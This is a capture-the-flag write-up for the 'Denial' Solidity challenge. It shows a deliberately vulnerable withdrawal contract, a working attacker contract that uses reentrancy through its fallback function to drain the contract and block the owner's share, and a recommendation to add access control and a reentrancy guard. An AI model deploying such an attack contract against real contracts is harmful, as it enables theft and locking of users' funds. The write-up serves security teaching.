**Description**

In this challenge, we have a contract with funds that can be withdrawn by the owner and any partner; the goal is to have funds within the contract that cannot be withdrawn.

Let's take a look at the code:

```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

First, we can see that the `setWithdrawPartner` method is accessible to everyone; thus, anyone can modify the `partner` variable to get funds whenever the `withdraw` function is invoked.

Also, the `withdraw()` function is vulnerable to reentrancy, and when the contract's balance drops below 100 Wei , the `amountToSend` variable will always round to zero.

**Attack Scenario**

First, we are going to deploy our attacker's contract, which will add itself as a withdraw partner and then try to withdraw from the contract. The function will then try to send native coin to the partner using the `call` function, then the fallback function of the partner will be executed, which will call the withdraw function once again, and the process continues while the contract is greater than or equal to 100.

The code will look something like this.

```solidity=
pragma solidity 0.8.0;

interface IDenial{
  function withdraw() external;
}

contract attack {

  address public instance;
  address public player;
  constructor (address _instance, address _player)
  {
    instance = _instance;
    player = _player;
  }

  function attackhh() external
  {
    IDenial(instance).withdraw();
  }

  function withdraw() external
  {
    payable(player).transfer(address(this).balance);
  }
  fallback() payable external{
    if (instance.balance >= 100)
      IDenial(instance).withdraw();
  }
}
```

This way, the owner will not get any ether, and it will still have some of it locked down.

**Recommendatiom**

Consider adding access control to the `setWithdrawPartner` function and adding a reentrancy guard to functions that use the `call` function.